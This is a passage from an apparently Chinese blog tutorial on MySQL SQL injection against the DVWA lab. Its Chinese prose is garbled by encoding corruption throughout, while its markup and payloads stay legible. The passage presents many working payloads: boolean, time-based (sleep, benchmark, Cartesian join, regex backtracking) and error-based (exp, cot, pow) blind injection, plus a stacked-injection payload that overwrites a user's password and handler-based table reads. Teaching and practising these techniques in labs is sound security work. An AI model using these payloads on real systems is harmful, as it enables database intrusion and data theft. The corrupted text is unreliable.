          <td style="text-align: center">ä» m ä½ç½®æˆªå–stringå­—ç¬¦ä¸² n ä½ï¼Œåˆå§‹ä½ç½®ä¸º1ï¼Œn å¯çœç•¥</td>
      </tr>
      <tr>
          <td style="text-align: center">length(string)</td>
          <td style="text-align: center">è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td>
      </tr>
      <tr>
          <td style="text-align: center">ord(string)</td>
          <td style="text-align: center">è¿”å› string æœ€å·¦é¢å­—ç¬¦çš„ ASCII ç å€¼</td>
      </tr>
      <tr>
          <td style="text-align: center">left(string, len)</td>
          <td style="text-align: center">ä»å·¦æˆªå– string çš„å‰ len ä½</td>
      </tr>
      <tr>
          <td style="text-align: center">ascii()</td>
          <td style="text-align: center">å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸º ASCII ç å€¼</td>
      </tr>
      <tr>
          <td style="text-align: center">if(exp1, exp2, exp3)</td>
          <td style="text-align: center">å¦‚æœ exp1 æ­£ç¡®ï¼Œå°±æ‰§è¡Œ exp2 ï¼Œå¦åˆ™æ‰§è¡Œ exp3</td>
      </tr>
      <tr>
          <td style="text-align: center">sleep(time)</td>
          <td style="text-align: center">ä¼‘çœ å¤šå°‘ç§’</td>
      </tr>
  </tbody>
</table></div>
<h3 id="å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨
</h3><p>å½“æˆ‘ä»¬æŸ¥è¯¢çš„æ•°æ®åœ¨æ•°æ®åº“å­˜åœ¨æ—¶ï¼Œå°±ä¼šè¿”å›ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User ID exists in the database
</span></span></code></pre></div><p>åä¹‹ï¼Œåˆ™ä¼šè¿”å›ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User ID is MISSING from the database
</span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€äº›åˆ¤åˆ«å¼ï¼Œè§‚å¯Ÿé¡µé¢è¿”å›å€¼ï¼Œæ¥åˆ¤æ–­è¾“å…¥çš„è¯­å¥æ˜¯å¦ä¸ºçœŸ</p>
<h4 id="çŒœæµ‹é•¿åº¦">çŒœæµ‹é•¿åº¦
</h4><p><strong>ä½¿ç”¨ä¸(and)ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())=4 #
</span></span></code></pre></div><p><strong>ä½¿ç”¨æˆ–(or)ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; or length(database())=4 #
</span></span></code></pre></div><p>é¡µé¢è¿”å›existsï¼Œè¯´æ˜æ•°æ®åº“åç§°é•¿åº¦ä¸º4</p>
<p>å¦‚æœåº“åå®åœ¨é•¿ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<strong>äºŒåˆ†æ³•</strong>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length(database())&gt;4 #
</span></span></code></pre></div><h4 id="çŒœæµ‹åº“å">çŒœæµ‹åº“å
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and substring(database(),1,1)=&#39;d&#39; #
</span></span></code></pre></div><p>å¦‚æœä¸æƒ³ä½¿ç”¨<code>''</code>åŒ…è£¹å­—æ¯ï¼Œä¹Ÿå¯ä»¥è½¬æ¢æˆasciiç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),1,1))=100 #
</span></span></code></pre></div><p>ä¸€æ­¥æ­¥å°è¯•ï¼Œç›´åˆ°å°è¯•å‡ºå®Œæ•´çš„æ•°æ®åº“åç§°</p>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬åœ¨çŸ¥é“asciiç è¡¨çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨äºŒåˆ†æ³•æ›´å¿«ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and ascii(substr(database(),1,1))&gt;64 #
</span></span></code></pre></div><p>å¦‚æœsubstringè¢«è¿‡æ»¤äº†ï¼š<a class="link" href="#reverse&#43;left%e4%bb%a3%e6%9b%bfsubstring" >reverse+leftä»£æ›¿substring
    
</a></p>
<p>â€‹				       <a class="link" href="#trim%e4%bb%a3%e6%9b%bfsubstring" >trimä»£æ›¿substring
    
</a></p>
<p>é™„ä¸Šä¸€å¼ asciiç è¡¨ï¼š</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="ASCII è¡¨| èœé¸Ÿæ•™ç¨‹" href="http://picture.928330.xyz/typora/ascii-1-1.png">
<img src="http://picture.928330.xyz/typora/ascii-1-1.png" alt="ASCII è¡¨| èœé¸Ÿæ•™ç¨‹"  />
</a>
</div>
</p>
<h4 id="çŒœæµ‹è¡¨çš„æ•°é‡">çŒœæµ‹è¡¨çš„æ•°é‡
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2 #
</span></span></code></pre></div><h4 id="çŒœæµ‹è¡¨2çš„é•¿åº¦">çŒœæµ‹è¡¨2çš„é•¿åº¦
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1))=5#
</span></span></code></pre></div><p>æˆ–è€…æŠŠlengthæ”¾åœ¨selectåé¢ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (select length(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1)=5#
</span></span></code></pre></div><p><span style="color:red;font-size:20px"><strong>çŒœæµ‹è¡¨åï¼Œå­—æ®µåç­‰ç­‰çš„æ­¥éª¤éƒ½å¤§åŒå°å¼‚ï¼Œåœ¨æ­¤ä¸è¿‡å¤šèµ˜è¿°</strong></span></p>
<h3 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨
</h3><p>å¦‚æœé¡µé¢è¿existsè¿™æ ·çš„è¿”å›å­—æ ·éƒ½æ²¡æœ‰æ€ä¹ˆåŠï¼Ÿ</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±è¦å¯»æ‰¾æ–°çš„ç‰¹å¾ï¼Œæ¥æŒ‡ç¤ºæˆ‘ä»¬è¯­å¥æˆåŠŸæ‰§è¡Œäº†â€”â€”é‚£å°±æ˜¯æ—¶é—´</p>
<h4 id="sleepå»¶æ—¶">sleepå»¶æ—¶
</h4><p><mark><strong>åˆ©ç”¨ifå‡½æ•°å’Œsleepå‡½æ•°ï¼Œå¦‚æœè¯­å¥æˆåŠŸæ‰§è¡Œï¼Œå°±è®©é¡µé¢å»¶æ—¶ä¸€æ®µæ—¶é—´ï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(length(database())=4,sleep(5),1)#
</span></span></code></pre></div><p><strong>æ³¨æ„æ­¤å¤„ifå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ªå¤±è´¥æ‰§è¡Œçš„è¯­å¥exp3ä¸èƒ½ä¸ºç©ºï¼Œè¦å¡«ä¸Š1è¡¥ç©º</strong></p>
<p><strong>å¦‚æœä¸ç”¨ifï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
</span></span></code></pre></div><p>é¡µé¢ä¼‘çœ äº†äº”ç§’ï¼Œè¯´æ˜è¯­å¥æ‰§è¡ŒæˆåŠŸï¼ˆsleep()è¿”å›äº†1,1*5=5ï¼‰ï¼Œæ•°æ®åº“åç§°é•¿ä¸º4</p>
<p>å¦‚æœifå‡½æ•°è¢«è¿‡æ»¤äº†ï¼š[case whenè¯­å¥ä»£æ›¿if](#case whenè¯­å¥ä»£æ›¿if)</p>
<h4 id="benchmarkå»¶æ—¶">benchmarkå»¶æ—¶
</h4><p><mark><strong>benchmark(count, exp)ï¼šå°†è¡¨è¾¾å¼expé‡å¤æ‰§è¡Œcountæ¬¡</strong></mark></p>
<p>åªè¦æˆ‘ä»¬è®©æ‰§è¡Œæ¬¡æ•°å¤Ÿå¤šï¼Œå°±èƒ½è¾¾åˆ°å’Œsleepä¸€æ ·çš„å»¶è¿Ÿæ•ˆæœï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&#39;a&#39;)),1)#
</span></span></code></pre></div><p>å¦‚æœæ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯dï¼Œå°±è®©æ•°æ®åº“è®¡ç®—äº”ç™¾ä¸‡æ¬¡açš„md5å€¼ï¼Œè¿™ä¸ªè¿‡ç¨‹è¿‘ä¼¼äº”ç§’</p>
<h4 id="ç¬›å¡å°”ç§¯å»¶æ—¶">ç¬›å¡å°”ç§¯å»¶æ—¶
</h4><p><strong><mark>å½“æŸ¥è¯¢å‘ç”Ÿåœ¨å¤šä¸ªè¡¨ä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•é™åˆ¶æ¡ä»¶æ—¶ï¼Œä¼šå°†å¤šä¸ªè¡¨å·²ç¬›å¡å°”ç§¯çš„å½¢å¼è”åˆèµ·æ¥ï¼š</mark></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
</span></span></code></pre></div><p>è¿™ä¸ªæŸ¥è¯¢å°†<code>information_schema.columns</code>è¿™å¼ è¡¨è‡ªèº«è¿›è¡Œäº†ä¸¤æ¬¡è¿æ¥ï¼ŒæŸ¥è¯¢èµ·æ¥å¾ˆè´¹æ—¶ï¼ˆå¤§æ¦‚è¦ä¸¤ä¸‰ç§’ï¼‰</p>
<p>å¦‚æœæ„Ÿè§‰å»¶æ—¶ä¸å¤Ÿæ˜æ˜¾ï¼Œå¯ä»¥å¤šåŠ å‡ æ¬¡è‡ªè¿æ¥</p>
<h4 id="æ­£åˆ™åŒ¹é…å»¶æ—¶">æ­£åˆ™åŒ¹é…å»¶æ—¶
</h4><p><strong><mark>é€šè¿‡æ„é€ æ­£åˆ™è¡¨è¾¾å¼ï¼Œè®©æ•°æ®åº“çš„æ­£åˆ™å¼•æ“åœ¨è¿›è¡ŒåŒ¹é…æ—¶é™·å…¥å¤§é‡çš„å›æº¯è®¡ç®—ï¼Œä»è€Œæ¶ˆè€—æé•¿çš„CPUæ—¶é—´ï¼š</mark></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&#39;a&#39;,9999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)), 1)#
</span></span></code></pre></div><p>æˆ‘ä»¬æ¥çœ‹çœ‹å…¶ä¸­çš„æ­£åˆ™å»¶æ—¶éƒ¨åˆ†æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)
</span></span></code></pre></div><ul>
<li>
<p><strong><code>rpad(str,len,padstr)</code>ï¼šç”¨å­—ç¬¦ä¸²<code>padstr</code>å¯¹<code>str</code>è¿›è¡Œå³è¾¹å¡«è¡¥ï¼Œç›´è‡³å®ƒçš„é•¿åº¦è¾¾åˆ°<code>len</code>ï¼Œç„¶åè¿”å› <code>str</code></strong></p>
<p>â€‹			         <strong>å¦‚æœ<code>str</code>çš„é•¿åº¦é•¿äº<code>len</code>ï¼Œé‚£ä¹ˆå®ƒå°†è¢«æˆªé™¤åˆ°<code>len</code>ä¸ªå­—ç¬¦</strong></p>
</li>
<li>
<p><strong><code>(a.*)+</code>ï¼šå†…éƒ¨çš„ <code>.*</code> å’Œå¤–éƒ¨çš„ <code>+</code> éƒ½æ˜¯è´ªå©ªé‡è¯ï¼Œå½“æ­£åˆ™å¼•æ“ç”¨è¿™ä¸ªæ¨¡å¼å»åŒ¹é…ä¸€ä¸ªé•¿å­—ç¬¦ä¸²æ—¶ï¼Œå­˜åœ¨æŒ‡æ•°çº§çš„å¯èƒ½æ€§æ¥åˆ’åˆ†å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼Œ<code>(a)(a)(a)</code>ã€<code>(aa)(a)</code>ã€<code>(a)(aa)</code>ç­‰ï¼‰ï¼Œå¼•æ“éœ€è¦å°è¯•æ‰€æœ‰è¿™äº›è·¯å¾„</strong></p>
</li>
<li>
<p><strong><code>b</code>: åœ¨æ¨¡å¼æœ«å°¾åŠ ä¸Šä¸€ä¸ªæºå­—ç¬¦ä¸²ä¸­ä¸å­˜åœ¨çš„å­—ç¬¦<code>'b'</code>ï¼Œæ˜¯ä¸ºäº†ç¡®ä¿æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æœ€ç»ˆä¸€å®šä¼šå¤±è´¥ã€‚è¿™ä¼šè¿«ä½¿æ­£åˆ™å¼•æ“è€—å°½æ‰€æœ‰å¯èƒ½çš„å›æº¯è·¯å¾„ï¼Œä»è€Œå°†å»¶è¿Ÿæ—¶é—´æœ€å¤§åŒ–</strong></p>
</li>
<li>
<p><strong><code>repeat(str,times)</code>ï¼šå­—ç¬¦ä¸²<code>str</code>å¤åˆ¶<code>times</code>æ¬¡</strong></p>
</li>
</ul>
<div class="alert alert-warning">
    <div class="alert-header">
        <span class="alert-icon">
            âš ï¸
        </span>
        <span class="alert-title">
            Warning
        </span>
    </div>
    <div class="alert-content">
        <p>æˆ‘åœ¨dvwaä¸Šä½¿ç”¨ä¸Šè¿°çš„æ­£åˆ™åŒ¹é…æ–¹å¼æ— æ³•å¾—åˆ°å»¶æ—¶ç»“æœï¼Œå¦‚æœæ‚¨çŸ¥é“ä¸ºä»€ä¹ˆè¯·ç•™è¨€&gt;&lt;</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://www.cdxy.me/?p=789"  target="_blank" rel="noopener"
    >MySQLæ—¶é—´ç›²æ³¨äº”ç§å»¶æ—¶æ–¹æ³•
    
    <span style="white-space: nowrap;"><svg width=".7em"
        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
            fill="currentColor">
    </svg></span>
    
</a></p></div>
</div>
<p><span style="color:red;font-size:20px"><strong>æ—¶é—´ç›²æ³¨å…¶ä½™çš„æ“ä½œé¡ºåºå’Œå¸ƒå°”ç›²æ³¨ç›¸åŒï¼Œåªæ˜¯æ¢äº†ä¸€ç§æ–¹å¼å®ç°åˆ¤æ–­</strong></span></p>
<h3 id="æŠ¥é”™ç›²æ³¨">æŠ¥é”™ç›²æ³¨
</h3><p>æŠ¥é”™ç›²æ³¨çš„æ€æƒ³å’Œæ—¶é—´ç›²æ³¨ç›¸åŒï¼Œéƒ½æ˜¯åˆ©ç”¨ifå‡½æ•°</p>
<p>ä¸åŒç‚¹åœ¨äºï¼ŒæŠ¥é”™ç›²æ³¨ä¸ä¾èµ–é¡µé¢æ˜¯å¦å»¶æ—¶åˆ¤æ–­ï¼Œè€Œæ˜¯ä¾èµ–é¡µé¢æ˜¯å¦æŠ¥é”™åˆ¤æ–­</p>
<p>sqlä¸­å­˜åœ¨å¾ˆå¤šæ•°å­¦è®¡ç®—å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿä¸»è¦åˆ©ç”¨ä»–ä»¬æ¥å®ç°æŠ¥é”™</p>
<h4 id="exp">exp()
</h4><p><strong><code>exp(x)</code>è¿”å›eçš„xæ¬¡æ–¹ï¼Œä¹Ÿå°±æ˜¯e^x^</strong></p>
<p>å½“ä¼ é€’ç»™<code>exp()</code>çš„å‚æ•°è¿‡å¤§ï¼ˆåœ¨MySQLä¸­çº¦å¤§äº<strong>709</strong>ï¼‰æ—¶ï¼Œä¼šäº§ç”Ÿæ•°å€¼è¶Šç•Œé”™è¯¯</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½è¿ç®—ç¬¦<code>~</code>è¿ç®—0è·å¾—ä¸€ä¸ªå·¨å¤§çš„æ•´æ•°ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
</span></span></code></pre></div><p>æˆ‘ä»¬çŸ¥é“ï¼Œ<code>~0</code>çš„ç»“æœæ˜¯64ä½æ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼ï¼Œè¿œå¤§äº709ï¼Œå› æ­¤<code>exp()</code>å‡½æ•°æ‰§è¡Œæ—¶å¿…å®šä¼šæº¢å‡ºæŠ¥é”™ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>DOUBLE value is out of range in &#39;exp(~(0))&#39;
</span></span></code></pre></div><p>ä½ ä¹Ÿå¯ä»¥é€‰æ‹©æ‰‹åŠ¨è¾“å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ï¼Œæ¯”å¦‚exp(99999)</p>
<p><strong>åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ç”¨ifå‡½æ•°ï¼Œåªè¦åˆ©ç”¨åˆ¤æ–­çš„è¿”å›å€¼åšè¿ç®—å³å¯ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
</span></span></code></pre></div><p><strong>å¦‚æœ<code>ascii(substring(database(),1,1))=100</code>ä¸º<mark>çœŸ</mark>ï¼Œé‚£ä¹ˆè¿ç®—å¼ä¸º<code>exp(1*99999)</code>ï¼Œä¹Ÿå°±æ˜¯<code>exp(99999)</code>ï¼Œå°±ä¼šæŠ¥é”™</strong></p>
<h4 id="cot">cot()
</h4><p><strong><code>cot()</code>æ˜¯ä½™åˆ‡ä¸‰è§’å‡½æ•°ï¼Œè€Œä¼—æ‰€å‘¨çŸ¥ï¼Œ<code>cot(0)</code>æ˜¯ä¸å­˜åœ¨çš„ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
</span></span></code></pre></div><p><strong>ä¹Ÿå¯ä»¥ä¸ç”¨ifå‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and cot((ascii(substring(database(),1,1))=100)=0)#
</span></span></code></pre></div><p><strong>å¦‚æœ<code>ascii(substring(database(),1,1))=100</code>ä¸º<mark>çœŸ</mark>ï¼Œé‚£ä¹ˆè¿ç®—å¼ä¸º<code>cot(1=0)</code>ï¼Œä¹Ÿå°±æ˜¯<code>cot(0)</code>ï¼Œå°±ä¼šæŠ¥é”™</strong></p>
<h4 id="pow">pow()
</h4><p><strong><code>pow(a,b)</code>å‡½æ•°ç”¨äºæ±‚a^b^çš„å€¼</strong>ï¼Œç›¸ä¿¡ä½ å·²ç»çŸ¥é“æ€ä¹ˆåšäº†ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
</span></span></code></pre></div><p>ä¸ä½¿ç”¨ifå‡½æ•°ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
</span></span></code></pre></div><p><strong>å¦‚æœ<code>ascii(substring(database(),1,1))=100</code>ä¸º<mark>çœŸ</mark>ï¼Œé‚£ä¹ˆè¿ç®—å¼å°±æ˜¯<code>pow(1+1,99999)</code>,ä¹Ÿå°±æ˜¯2^99999^ï¼Œå°±ä¼šæŠ¥é”™</strong></p>
<h2 id="4-å †å æ³¨å…¥">#4 å †å æ³¨å…¥
</h2><p>æœ‰äº›åº”ç”¨æœåŠ¡æ‰§è¡Œsqlä½¿ç”¨çš„ä¸æ˜¯<code>mysqli_query()</code>,è€Œæ˜¯<code>mysqli_multi_query()</code>æ–¹æ³•ï¼Œå¯ä»¥åšåˆ°æ‰§è¡Œå¤šæ¡sqlè¯­å¥</p>
<h3 id="æ™®é€šå¤šè¯­å¥æ³¨å…¥">æ™®é€šå¤šè¯­å¥æ³¨å…¥
</h3><p><strong>å¦‚æœåˆæ°å¥½æ²¡æœ‰è¿‡æ»¤<code>;</code>ï¼Œæˆ‘ä»¬å°±èƒ½ä½¿ç”¨<code>;</code>åˆ†å‰²è¯­å¥ï¼Œåˆ©ç”¨sqlè¯­å¥è¿›è¡Œå„ç§æ“ä½œï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2;update users set password=123 where id=1--+
</span></span></code></pre></div><p>è¿™æ ·å°±ç¯¡æ”¹äº†å¯†ç </p>
<p><strong>ä½†èƒ½ä½¿ç”¨å †å æ³¨å…¥çš„åœºæ™¯ä¸€èˆ¬éƒ½å¯¹è¯­å¥åšäº†è¿‡æ»¤ï¼Œå°¤å…¶æ˜¯selectè¿™æ ·çš„æ ¸å¿ƒæŸ¥è¯¢è¯­å¥ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ«çš„æ¥ä»£æ›¿</strong></p>
<h3 id="showæŸ¥è¯¢">showæŸ¥è¯¢
</h3><h4 id="æŸ¥è¯¢æ•°æ®åº“åç§°">æŸ¥è¯¢æ•°æ®åº“åç§°
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">databases</span>;
</span></span></code></pre></div><h4 id="æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨">æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">tables</span> <span style="color:#c678dd">from</span> æ•°æ®åº“å;
</span></span></code></pre></div><h4 id="æŸ¥çœ‹è¡¨çš„å­—æ®µ">æŸ¥çœ‹è¡¨çš„å­—æ®µ
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">columns</span> <span style="color:#c678dd">from</span> è¡¨å;
</span></span></code></pre></div><p>æˆ–è€…ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">describe</span> è¡¨å;
</span></span></code></pre></div><p>æˆ–è€…ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">desc</span> è¡¨å;
</span></span></code></pre></div><h4 id="æŸ¥çœ‹åˆ›å»ºè¡¨çš„è¯­å¥">æŸ¥çœ‹åˆ›å»ºè¡¨çš„è¯­å¥
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#c678dd">create</span> <span style="color:#c678dd">table</span> è¡¨å;
</span></span></code></pre></div><h3 id="handleræŸ¥è¯¢">handleræŸ¥è¯¢
</h3><p><strong>handleræ˜¯mysqlç‰¹æœ‰çš„è¯­å¥ï¼Œä»–å¯ä»¥é€šè¿‡å¥æŸ„æ¥è®¿é—®è¡¨</strong></p>
<p><strong>å¥æŸ„ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆ</strong></p>
<h4 id="æ‰“å¼€å¥æŸ„">æ‰“å¼€å¥æŸ„
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> è¡¨å <span style="color:#c678dd">open</span>;
</span></span></code></pre></div><h4 id="æŸ¥çœ‹ç¬¬ä¸€è¡Œæ•°æ®">æŸ¥çœ‹ç¬¬ä¸€è¡Œæ•°æ®
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> è¡¨å <span style="color:#c678dd">read</span> <span style="color:#c678dd">first</span>;
</span></span></code></pre></div><h4 id="æŸ¥çœ‹ä¸‹ä¸€è¡Œæ•°æ®">æŸ¥çœ‹ä¸‹ä¸€è¡Œæ•°æ®
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> è¡¨å <span style="color:#c678dd">read</span> <span style="color:#c678dd">next</span>;
</span></span></code></pre></div><p>å¦‚æœä¸é€‚ç”¨firstï¼Œç›´æ¥ä½¿ç”¨nextï¼Œæ•ˆæœç­‰åŒäºfirst</p>
<h4 id="æŸ¥çœ‹æŸä¸€è¡Œæ•°æ®">æŸ¥çœ‹æŸä¸€è¡Œæ•°æ®
